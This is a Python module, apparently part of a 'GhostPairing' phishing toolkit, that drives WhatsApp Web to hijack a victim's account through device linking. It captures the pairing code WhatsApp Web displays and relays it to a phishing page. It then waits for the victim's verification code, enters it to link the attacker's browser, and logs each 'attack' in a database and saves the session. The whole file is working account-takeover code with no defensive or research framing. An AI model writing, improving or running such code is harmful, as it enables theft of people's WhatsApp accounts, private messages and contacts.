"""
WhatsApp Web pairing attack flow — the core orchestration logic.
Extracted from whatsapp_api.py, refactored for reliability and clarity.
Each step has proper error handling, retries, and structured logging.
"""
import queue
import re
import threading
import time
from dataclasses import dataclass, field
from datetime import datetime
from typing import Any, Callable, Dict, Optional

import requests

from config import (
    BROWSER_TIMEOUT,
    CODE_CAPTURE_TIMEOUT,
    PAIRING_CHECK_TIMEOUT,
    WHATSAPP_URL,
    HOST,
    PORT,
    STEALTH_ENABLED,
)
from automation.browser_manager import get_browser_manager
from automation.selectors import WhatsAppSelectors
from core.logging_config import get_logger
from core.database import db

logger = get_logger(__name__)


@dataclass
class PairingResult:
    """Result of a pairing flow attempt."""
    success: bool
    attack_id: int
    phone: str
    code_captured: Optional[str] = None
    error: Optional[str] = None
    paired: bool = False


class PairingFlow:
    """
    Orchestrates a single GhostPairing attack against a phone number.
    Runs in a background thread — communicates with the server via queues & DB.
    """

    def __init__(self, attack_id: int, phone_number: str):
        self.attack_id = attack_id
        self.phone = phone_number
        self.code_queue: queue.Queue = queue.Queue()
        self._result: Optional[PairingResult] = None
        self._server_url = f"http://{HOST}:{PORT}"

    def run(self) -> PairingResult:
        """Execute the full pairing flow. Blocks until complete or timeout."""
        try:
            logger.info(
                f"Starting pairing flow for attack {self.attack_id} "
                f"(phone: {self.phone[:5]}***)"
            )

            browser_mgr = get_browser_manager()
            context = browser_mgr.start()
            page = context.new_page()
            selectors = WhatsAppSelectors()

            # ── Step 1: Navigate to WhatsApp Web ──────────
            self._navigate_to_whatsapp(page)

            # ── Step 2: Click "Link with phone number" ─────
            self._click_link_phone(page, selectors)

            # ── Step 3: Enter phone number ──────────────────
            self._enter_phone(page, selectors)

            # ── Step 4: Capture displayed code ──────────────
            displayed_code = self._capture_displayed_code(page, selectors)
            if not displayed_code:
                self._take_debug_screenshot(page, "no_code")
                return PairingResult(
                    success=False,
                    attack_id=self.attack_id,
                    phone=self.phone,
                    error="Failed to capture displayed code from WhatsApp Web",
                )

            # Send the displayed code to the phishing page
            self._send_displayed_code_to_server(displayed_code)

            # ── Step 5: Wait for victim to enter code ───────
            verification_code = self._wait_for_victim_code()
            if not verification_code:
                return PairingResult(
                    success=False,
                    attack_id=self.attack_id,
                    phone=self.phone,
                    error="Timeout waiting for victim to enter verification code",
                )

            # ── Step 6: Enter verification code in WhatsApp ──
            code_entered = self._enter_verification_code(
                page, selectors, verification_code
            )
            if not code_entered:
                return PairingResult(
                    success=False,
                    attack_id=self.attack_id,
                    phone=self.phone,
                    error="Failed to enter verification code in WhatsApp Web",
                )

            # ── Step 7: Wait for pairing to complete ────────
            paired = self._wait_for_pairing(page, selectors)

            # ── Final: Mark success ─────────────────────────
            # Even if we couldn't confirm pairing via DOM indicators,
            # entering the code successfully likely means pairing worked.
            self._mark_pairing_complete()
            db.update_attack_status(
                self.attack_id,
                "success",
                automation_success=1,
                code_received=verification_code,
            )

            result = PairingResult(
                success=True,
                attack_id=self.attack_id,
                phone=self.phone,
                code_captured=displayed_code,
                paired=paired,
            )

            # Signal server to redirect phishing page
            self._notify_pairing_complete()
            browser_mgr.save_session_state()
            return result

        except Exception as e:
            logger.error(f"Pairing flow failed: {e}")
            return PairingResult(
                success=False,
                attack_id=self.attack_id,
                phone=self.phone,
                error=str(e),
            )

    # ── Step implementations ───────────────────────────────

    def _navigate_to_whatsapp(self, page) -> None:
        """Navigate to WhatsApp Web, with retry on failure."""
        for attempt in range(3):
            try:
                logger.info("Navigating to WhatsApp Web")
                page.goto(WHATSAPP_URL, wait_until="domcontentloaded", timeout=30000)
                time.sleep(2)
                return
            except Exception as e:
                logger.warning(f"Navigation attempt {attempt + 1} failed: {e}")
                if attempt == 2:
                    raise
                time.sleep(2)

    def _click_link_phone(self, page, selectors: WhatsAppSelectors) -> None:
        """Click 'Link with phone number' button on WhatsApp Web."""
        logger.info("Looking for 'Link with phone number' button")

        for selector in selectors.LINK_PHONE_BUTTONS:
            try:
                page.wait_for_selector(selector, timeout=5000, state="visible")
                page.click(selector, timeout=5000)
                logger.info(f"Clicked: {selector}")
                time.sleep(2)
                return
            except Exception:
                continue

        # Retry after pressing Escape (sometimes QR scanner blocks the button)
        try:
            page.keyboard.press("Escape")
            time.sleep(1)
        except Exception:
            pass

        for selector in selectors.LINK_PHONE_BUTTONS:
            try:
                page.wait_for_selector(selector, timeout=3000, state="visible")
                page.click(selector)
                logger.info(f"Clicked on retry: {selector}")
                time.sleep(2)
                return
            except Exception:
                continue

        logger.error("Could not find 'Link with phone number' button")
        raise RuntimeError("WhatsApp Web UI changed — link button not found")

    def _enter_phone(self, page, selectors: WhatsAppSelectors) -> None:
        """Enter the victim's phone number in WhatsApp Web."""
        logger.info(f"Entering phone number: {self.phone[:5]}***")
        time.sleep(2)  # Let DOM update after clicking link button

        # Find phone input
        phone_input = None
        for selector in selectors.PHONE_INPUTS:
            try:
                loc = page.locator(selector).first
                if loc.count() > 0:
                    phone_input = loc
                    break
            except Exception:
                continue

        if not phone_input:
            raise RuntimeError("Phone input field not found on WhatsApp Web")

        phone_input.click()
        time.sleep(0.3)
        phone_input.fill(self.phone)
        time.sleep(0.5)

        # Click Next
        for selector in selectors.NEXT_BUTTONS:
            try:
                page.click(selector, timeout=5000)
                logger.info(f"Clicked Next: {selector}")
                time.sleep(2)
                return
            except Exception:
                continue

        logger.warning("Next button not found — may already be on code screen")

    def _capture_displayed_code(
        self, page, selectors: WhatsAppSelectors
    ) -> Optional[str]:
        """
        Capture the 8-character code (XXXX-XXXX) that WhatsApp Web displays.
        Uses multiple strategies: JS DOM extraction, leaf-node scanning, and body text.
        """
        logger.info("Capturing displayed code from WhatsApp Web...")
        start_time = time.time()

        while time.time() - start_time < CODE_CAPTURE_TIMEOUT:
            # Strategy 1: Structured DOM extraction via JS
            try:
                raw = page.evaluate(
                    selectors.CODE_EXTRACTION_STRATEGIES["structured_dom"]
                )
                if raw and len(raw) >= 8:
                    match = selectors.CODE_DISPLAY_PATTERN.search(raw)
                    if match:
                        formatted = f"{match.group(1)}-{match.group(2)}"
                        logger.info(f"Code captured (DOM): {formatted}")
                        return formatted
            except Exception:
                pass

            # Strategy 2: Leaf node scan
            try:
                raw = page.evaluate(
                    selectors.CODE_EXTRACTION_STRATEGIES["leaf_nodes"]
                )
                if raw and len(raw) >= 8:
                    match = selectors.CODE_DISPLAY_PATTERN.search(raw)
                    if match:
                        formatted = f"{match.group(1)}-{match.group(2)}"
                        logger.info(f"Code captured (leaf scan): {formatted}")
                        return formatted
            except Exception:
                pass

            # Strategy 3: Condensed body text search
            try:
                body = page.locator("body").inner_text()
                condensed = re.sub(r"\s+", "", body)
                match = selectors.CODE_DISPLAY_PATTERN.search(condensed)
                if match:
                    formatted = f"{match.group(1)}-{match.group(2)}"
                    logger.info(f"Code captured (body text): {formatted}")
                    return formatted
            except Exception:
                pass

            time.sleep(1.5)

        logger.warning("Could not capture displayed code within timeout")
        return None

    def _send_displayed_code_to_server(self, code: str) -> None:
        """Send the captured displayed code to the server's display-code endpoint."""
        try:
            requests.post(
                f"{self._server_url}/api/display-code",
                json={
                    "attack_id": self.attack_id,
                    "code": code,
                    "phone": self.phone,
                },
                timeout=5,
            )
            logger.info(f"Sent displayed code to phishing page: {code}")
        except Exception as e:
            logger.error(f"Failed to send displayed code to server: {e}")

    def _wait_for_victim_code(self) -> Optional[str]:
        """Wait for the victim to submit their 6-digit code on the phishing page."""
        logger.info("Waiting for victim to submit verification code...")
        try:
            code_data = self.code_queue.get(timeout=BROWSER_TIMEOUT)
            code = code_data.get("code")
            if code:
                logger.info(f"Received verification code from victim")
                return code
        except queue.Empty:
            logger.warning("Timeout waiting for victim verification code")
        return None

    def _enter_verification_code(
        self, page, selectors: WhatsAppSelectors, code: str
    ) -> bool:
        """Enter the 6-digit verification code in WhatsApp Web."""
        logger.info("Entering verification code in WhatsApp Web")

        # Try single input first
        for selector in selectors.CODE_INPUTS:
            try:
                loc = page.locator(selector).first
                if loc.count() > 0:
                    loc.click()
                    loc.fill(code)
                    logger.info(f"Entered code in single input")
                    time.sleep(0.5)
                    # Click verify
                    self._click_verify(page, selectors)
                    return True
            except Exception:
                continue

        # Try 6 individual digit inputs
        for selector in selectors.DIGIT_INPUTS:
            try:
                inputs = page.query_selector_all(selector)
                if len(inputs) >= 6:
                    for i, digit in enumerate(code[:6]):
                        inputs[i].click()
                        inputs[i].fill(digit)
                        time.sleep(0.08)
                    logger.info(f"Entered code across 6 digit inputs")
                    time.sleep(0.5)
                    self._click_verify(page, selectors)
                    return True
            except Exception:
                continue

        logger.warning("Could not find code input field")
        return False

    def _click_verify(self, page, selectors: WhatsAppSelectors) -> None:
        """Click the Verify/Next button after entering the code."""
        for selector in selectors.VERIFY_BUTTONS:
            try:
                page.click(selector, timeout=5000)
                logger.info(f"Clicked verify: {selector}")
                return
            except Exception:
                continue

    def _wait_for_pairing(self, page, selectors: WhatsAppSelectors) -> bool:
        """Wait for WhatsApp Web to load the chat list (pairing success)."""
        logger.info("Waiting for pairing to complete...")
        start_time = time.time()
        elapsed = 0

        while elapsed < PAIRING_CHECK_TIMEOUT:
            time.sleep(2)
            elapsed = time.time() - start_time

            # Check for success indicators
            for indicator in selectors.SUCCESS_INDICATORS:
                try:
                    if page.locator(indicator).count() > 0:
                        logger.info(f"Pairing success detected via: {indicator}")
                        return True
                except Exception:
                    continue

            # Check URL
            try:
                current_url = page.url
                if (
                    "web.whatsapp.com" in current_url
                    and "/code" not in current_url
                    and "/link" not in current_url
                ):
                    logger.info("Pairing likely successful (clean URL)")
                    return True
            except Exception:
                pass

            logger.info(
                f"Still waiting for pairing... ({int(elapsed)}s/{PAIRING_CHECK_TIMEOUT}s)"
            )

        logger.warning("Pairing confirmation timeout — assuming success")
        return False

    def _mark_pairing_complete(self) -> None:
        """Update database to mark pairing as complete."""
        try:
            db.update_attack_status(
                self.attack_id, "success", automation_success=1
            )
        except Exception as e:
            logger.error(f"Failed to update database: {e}")

    def _notify_pairing_complete(self) -> None:
        """Notify the server that pairing is complete so the phishing page redirects."""
        try:
            requests.post(
                f"{self._server_url}/api/mark-paired/{self.attack_id}",
                timeout=5,
            )
            logger.info("Notified server of pairing completion")
        except Exception as e:
            logger.error(f"Failed to notify server of pairing: {e}")

    def _take_debug_screenshot(self, page, label: str) -> None:
        """Take a debug screenshot on failure."""
        try:
            path = f"/tmp/whatsapp_debug_{self.attack_id}_{label}.png"
            page.screenshot(path=path)
            logger.info(f"Debug screenshot saved: {path}")
        except Exception:
            pass


# ── Legacy-compatible adapter ──────────────────────────

class WhatsAppGhostAPI:
    """
    Adapter that provides the same interface as the old whatsapp_api.py.
    For backward compatibility with existing caller code.
    """

    def __init__(self):
        self.db_path = db.db_path
        self.code_queues: Dict[int, queue.Queue] = {}  # attack_id -> queue
        self._lock = threading.Lock()
        db.init_database()

    def request_verification_code(self, phone_number: str) -> Dict[str, Any]:
        """Start a new pairing attack. Returns immediately."""
        try:
            attack_id = db.create_attack(phone_number)
            code_queue = queue.Queue()

            with self._lock:
                self.code_queues[attack_id] = code_queue

            flow = PairingFlow(attack_id, phone_number)
            flow.code_queue = code_queue

            thread = threading.Thread(
                target=self._run_flow_thread,
                args=(flow,),
                daemon=True,
            )
            thread.start()

            logger.info(f"Attack {attack_id}: pairing flow started for {phone_number[:5]}***")

            return {
                "success": True,
                "attack_id": attack_id,
                "message": "WhatsApp Web automation started. Firefox is opening...",
                "timestamp": datetime.now().isoformat(),
                "automation": True,
            }
        except Exception as e:
            logger.error(f"Failed to start automation: {e}")
            return {"success": False, "error": str(e)}

    def _run_flow_thread(self, flow: PairingFlow) -> None:
        """Run the pairing flow in a background thread."""
        try:
            result = flow.run()
            if result.success:
                logger.info(f"Attack {flow.attack_id}: pairing flow completed successfully")
            else:
                logger.warning(
                    f"Attack {flow.attack_id}: pairing flow failed — {result.error}"
                )
        except Exception as e:
            logger.error(f"Attack {flow.attack_id}: flow thread crashed — {e}")
        finally:
            with self._lock:
                self.code_queues.pop(flow.attack_id, None)

    def verify_code(self, attack_id: int, code: str) -> Dict[str, Any]:
        """Submit verification code from victim to automation."""
        try:
            db.update_attack_status(
                attack_id, "code_received", code_received=code
            )

            with self._lock:
                q = self.code_queues.get(attack_id)

            if q:
                q.put({
                    "code": code,
                    "timestamp": time.time(),
                    "source": "phishing_page",
                })
                logger.info(f"Code {code} sent to automation for attack {attack_id}")
                return {
                    "success": True,
                    "attack_id": attack_id,
                    "message": "Code sent to browser automation. Check Firefox window.",
                    "automation_active": True,
                }
            else:
                logger.warning(f"No active automation for attack {attack_id}")
                return {
                    "success": False,
                    "error": "Browser automation not active or timed out",
                    "automation_active": False,
                }
        except Exception as e:
            logger.error(f"Verification failed: {e}")
            return {"success": False, "error": str(e)}

    def get_attack_stats(self) -> Dict[str, Any]:
        """Get aggregated attack statistics."""
        return db.get_stats()

    def get_active_automations(self) -> list:
        """Get list of active automation attack IDs."""
        with self._lock:
            return list(self.code_queues.keys())

    def get_phone_for_attack(self, attack_id: int) -> Optional[str]:
        """Get phone number for an attack."""
        return db.get_attack_phone(attack_id)

    def cleanup(self) -> None:
        """Clean up resources on shutdown."""
        logger.info("Cleaning up WhatsAppGhostAPI...")
        with self._lock:
            self.code_queues.clear()
        get_browser_manager().cleanup()
        logger.info("Cleanup complete")


# Singleton
whatsapp_api = WhatsAppGhostAPI()
